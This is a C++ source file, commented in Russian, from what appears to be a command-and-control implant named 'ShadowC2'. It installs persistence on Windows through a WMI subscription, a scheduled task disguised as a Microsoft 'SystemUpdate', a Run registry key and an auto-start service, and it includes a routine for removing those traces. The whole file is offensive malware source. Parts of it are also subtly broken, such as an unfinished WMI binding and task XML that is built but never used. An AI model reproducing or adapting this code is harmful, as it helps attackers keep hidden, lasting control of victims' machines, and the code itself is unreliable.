#include "shadow.h"
#include <comdef.h>
#include <wbemidl.h>

// WMI подписка для персистентности
BOOL CreateWMISubscription() {
    HRESULT hres;
    
    // Инициализируем COM
    hres = CoInitializeEx(0, COINIT_MULTITHREADED);
    if (FAILED(hres)) return FALSE;
    
    // Устанавливаем уровень безопасности
    hres = CoInitializeSecurity(NULL, -1, NULL, NULL, RPC_C_AUTHN_LEVEL_DEFAULT,
        RPC_C_IMP_LEVEL_IMPERSONATE, NULL, EOAC_NONE, NULL);
    
    if (FAILED(hres)) {
        CoUninitialize();
        return FALSE;
    }
    
    // Получаем доступ к WMI
    IWbemLocator* pLoc = NULL;
    hres = CoCreateInstance(CLSID_WbemLocator, 0, CLSCTX_INPROC_SERVER,
        IID_IWbemLocator, (LPVOID*)&pLoc);
    
    if (FAILED(hres)) {
        CoUninitialize();
        return FALSE;
    }
    
    IWbemServices* pSvc = NULL;
    hres = pLoc->ConnectServer(_bstr_t(L"ROOT\\CIMV2"), NULL, NULL, 0, NULL, 0, 0, &pSvc);
    
    if (FAILED(hres)) {
        pLoc->Release();
        CoUninitialize();
        return FALSE;
    }
    
    // Устанавливаем уровень безопасности для WMI
    hres = CoSetProxyBlanket(pSvc, RPC_C_AUTHN_WINNT, RPC_C_AUTHZ_NONE, NULL,
        RPC_C_AUTHN_LEVEL_CALL, RPC_C_IMP_LEVEL_IMPERSONATE, NULL, EOAC_NONE);
    
    if (FAILED(hres)) {
        pSvc->Release();
        pLoc->Release();
        CoUninitialize();
        return FALSE;
    }
    
    // Создаем WMI Event Filter
    WCHAR wzFilterQuery[1024];
    wsprintf(wzFilterQuery,
        L"SELECT * FROM __InstanceModificationEvent WITHIN 60 "
        L"WHERE TargetInstance ISA 'Win32_PerfFormattedData_PerfOS_System' "
        L"AND TargetInstance.SystemUpTime >= 300");
    
    // Создаем команду для выполнения
    WCHAR wzCommand[1024];
    GetModuleFileName(NULL, wzCommand, MAX_PATH);
    
    WCHAR wzEventConsumer[2048];
    wsprintf(wzEventConsumer,
        L"CommandLineEventConsumer.Name=\"ShadowC2_Persistence\","
        L"CommandLineTemplate=\"%s\","
        L"ExecutablePath=\"%s\","
        L"WorkingDirectory=\"C:\\\\Windows\\\\System32\"",
        wzCommand, wzCommand);
    
    // Создаем подписку
    hres = pSvc->ExecNotificationQueryAsync(_bstr_t(L"WQL"), 
        _bstr_t(wzFilterQuery), WBEM_FLAG_SEND_STATUS, NULL, NULL);
    
    // Очистка
    pSvc->Release();
    pLoc->Release();
    CoUninitialize();
    
    return SUCCEEDED(hres);
}

// Создание Scheduled Task для персистентности
BOOL CreateScheduledTask() {
    WCHAR wzTaskName[] = L"\\Microsoft\\Windows\\ShadowC2\\SystemUpdate";
    WCHAR wzExecutablePath[MAX_PATH];
    
    GetModuleFileName(NULL, wzExecutablePath, MAX_PATH);
    
    // Создаем XML описание задачи
    WCHAR wzTaskXML[4096];
    wsprintf(wzTaskXML,
        L"<?xml version=\"1.0\" encoding=\"UTF-16\"?>"
        L"<Task version=\"1.2\" xmlns=\"http://schemas.microsoft.com/windows/2004/02/mit/task\">"
        L"<RegistrationInfo>"
        L"<Date>%s</Date>"
        L"<Author>Microsoft Corporation</Author>"
        L"<Description>System update service</Description>"
        L"</RegistrationInfo>"
        L"<Triggers>"
        L"<LogonTrigger>"
        L"<Enabled>true</Enabled>"
        L"<UserId>%s</UserId>"
        L"</LogonTrigger>"
        L"<TimeTrigger>"
        L"<Enabled>true</Enabled>"
        L"<StartBoundary>2024-01-01T00:00:00</StartBoundary>"
        L"<Interval>PT1H</Interval>"
        L"</TimeTrigger>"
        L"</Triggers>"
        L"<Principals>"
        L"<Principal id=\"Author\">"
        L"<RunLevel>HighestAvailable</RunLevel>"
        L"</Principal>"
        L"</Principals>"
        L"<Settings>"
        L"<MultipleInstancesPolicy>IgnoreNew</MultipleInstancesPolicy>"
        L"<DisallowStartIfOnBatteries>false</DisallowStartIfOnBatteries>"
        L"<StopIfGoingOnBatteries>false</StopIfGoingOnBatteries>"
        L"<AllowHardTerminate>false</AllowHardTerminate>"
        L"<StartWhenAvailable>true</StartWhenAvailable>"
        L"<RunOnlyIfNetworkAvailable>false</RunOnlyIfNetworkAvailable>"
        L"</Settings>"
        L"<Actions Context=\"Author\">"
        L"<Exec>"
        L"<Command>\"%s\"</Command>"
        L"<WorkingDirectory>C:\\Windows\\System32</WorkingDirectory>"
        L"</Exec>"
        L"</Actions>"
        L"</Task>",
        L"2024-01-01T00:00:00",
        L"SYSTEM",
        wzExecutablePath);
    
    // Используем COM для создания задачи
    HRESULT hres = CoInitialize(NULL);
    if (FAILED(hres)) return FALSE;
    
    ITaskService* pService = NULL;
    hres = CoCreateInstance(CLSID_TaskScheduler, NULL, CLSCTX_INPROC_SERVER,
        IID_ITaskService, (void**)&pService);
    
    if (FAILED(hres)) {
        CoUninitialize();
        return FALSE;
    }
    
    hres = pService->Connect(_variant_t(), _variant_t(), _variant_t(), _variant_t());
    if (FAILED(hres)) {
        pService->Release();
        CoUninitialize();
        return FALSE;
    }
    
    ITaskFolder* pRootFolder = NULL;
    hres = pService->GetFolder(_bstr_t(L"\\\\Microsoft\\Windows\\ShadowC2"), &pRootFolder);
    
    if (FAILED(hres)) {
        // Создаем папку если не существует
        ITaskFolder* pRoot = NULL;
        hres = pService->GetFolder(_bstr_t(L"\\\"), &pRoot);
        
        if (SUCCEEDED(hres)) {
            ITaskFolder* pMicrosoft = NULL;
            hres = pRoot->CreateFolder(_bstr_t(L"Microsoft"), _variant_t(), &pMicrosoft);
            
            if (SUCCEEDED(hres)) {
                ITaskFolder* pWindows = NULL;
                hres = pMicrosoft->CreateFolder(_bstr_t(L"Windows"), _variant_t(), &pWindows);
                
                if (SUCCEEDED(hres)) {
                    hres = pWindows->CreateFolder(_bstr_t(L"ShadowC2"), _variant_t(), &pRootFolder);
                    pWindows->Release();
                }
                
                pMicrosoft->Release();
            }
            
            pRoot->Release();
        }
    }
    
    if (FAILED(hres)) {
        pService->Release();
        CoUninitialize();
        return FALSE;
    }
    
    // Удаляем существующую задачу если есть
    pRootFolder->DeleteTask(_bstr_t(L"SystemUpdate"), 0);
    
    // Создаем новую задачу
    ITaskDefinition* pTask = NULL;
    hres = pService->NewTask(0, &pTask);
    
    if (SUCCEEDED(hres)) {
        // Регистрируем задачу
        IRegisteredTask* pRegisteredTask = NULL;
        hres = pRootFolder->RegisterTaskDefinition(_bstr_t(L"SystemUpdate"),
            pTask, TASK_CREATE_OR_UPDATE, _variant_t(L"SYSTEM"),
            _variant_t(), TASK_LOGON_SERVICE_ACCOUNT, _variant_t(L""), &pRegisteredTask);
        
        if (SUCCEEDED(hres)) {
            pRegisteredTask->Release();
        }
        
        pTask->Release();
    }
    
    pRootFolder->Release();
    pService->Release();
    CoUninitialize();
    
    return SUCCEEDED(hres);
}

// Работа с реестром для автозагрузки
BOOL AddToRegistryRun() {
    HKEY hKey;
    WCHAR wzExecutablePath[MAX_PATH];
    
    GetModuleFileName(NULL, wzExecutablePath, MAX_PATH);
    
    // Создаем ключ в реестре
    LONG lResult = RegCreateKeyEx(HKEY_CURRENT_USER,
        L"Software\\Microsoft\\Windows\\CurrentVersion\\Run",
        0, NULL, REG_OPTION_NON_VOLATILE, KEY_WRITE, NULL, &hKey, NULL);
    
    if (lResult != ERROR_SUCCESS) {
        // Пробуем в HKEY_LOCAL_MACHINE
        lResult = RegCreateKeyEx(HKEY_LOCAL_MACHINE,
            L"Software\\Microsoft\\Windows\\CurrentVersion\\Run",
            0, NULL, REG_OPTION_NON_VOLATILE, KEY_WRITE, NULL, &hKey, NULL);
        
        if (lResult != ERROR_SUCCESS) {
            return FALSE;
        }
    }
    
    // Добавляем значение
    lResult = RegSetValueEx(hKey, L"SystemUpdate", 0, REG_SZ,
        (LPBYTE)wzExecutablePath, (wcslen(wzExecutablePath) + 1) * sizeof(WCHAR));
    
    RegCloseKey(hKey);
    
    return (lResult == ERROR_SUCCESS);
}

// Создание службы Windows
BOOL CreateServicePersistence() {
    SC_HANDLE hSCManager = OpenSCManager(NULL, NULL, SC_MANAGER_CREATE_SERVICE);
    if (!hSCManager) return FALSE;
    
    WCHAR wzExecutablePath[MAX_PATH];
    GetModuleFileName(NULL, wzExecutablePath, MAX_PATH);
    
    // Создаем службу
    SC_HANDLE hService = CreateService(hSCManager, L"ShadowC2Update",
        L"System Update Service", SERVICE_ALL_ACCESS, SERVICE_WIN32_OWN_PROCESS,
        SERVICE_AUTO_START, SERVICE_ERROR_IGNORE, wzExecutablePath,
        NULL, NULL, NULL, NULL, NULL);
    
    if (hService) {
        // Запускаем службу
        StartService(hService, 0, NULL);
        CloseServiceHandle(hService);
    }
    
    CloseServiceHandle(hSCManager);
    
    return (hService != NULL);
}

// Основная функция установки персистентности
BOOL InstallPersistence() {
    DEBUG_PRINT("Installing persistence...\n");
    
    BOOL bResult = FALSE;
    
    // Пытаемся разные методы
    if (CreateWMISubscription()) {
        DEBUG_PRINT("WMI persistence installed\n");
        bResult = TRUE;
    }
    
    if (CreateScheduledTask()) {
        DEBUG_PRINT("Scheduled task persistence installed\n");
        bResult = TRUE;
    }
    
    if (AddToRegistryRun()) {
        DEBUG_PRINT("Registry persistence installed\n");
        bResult = TRUE;
    }
    
    // Служба требует прав администратора
    if (CreateServicePersistence()) {
        DEBUG_PRINT("Service persistence installed\n");
        bResult = TRUE;
    }
    
    return bResult;
}

// Функция для удаления следов персистентности
BOOL RemovePersistence() {
    DEBUG_PRINT("Removing persistence...\n");
    
    // Удаляем из реестра
    RegDeleteKey(HKEY_CURRENT_USER, L"Software\\Microsoft\\Windows\\CurrentVersion\\Run\\SystemUpdate");
    RegDeleteKey(HKEY_LOCAL_MACHINE, L"Software\\Microsoft\\Windows\\CurrentVersion\\Run\\SystemUpdate");
    
    // Удаляем службу
    SC_HANDLE hSCManager = OpenSCManager(NULL, NULL, SC_MANAGER_CONNECT);
    if (hSCManager) {
        SC_HANDLE hService = OpenService(hSCManager, L"ShadowC2Update", SERVICE_STOP | DELETE);
        if (hService) {
            SERVICE_STATUS status;
            ControlService(hService, SERVICE_CONTROL_STOP, &status);
            DeleteService(hService);
            CloseServiceHandle(hService);
        }
        CloseServiceHandle(hSCManager);
    }
    
    return TRUE;
}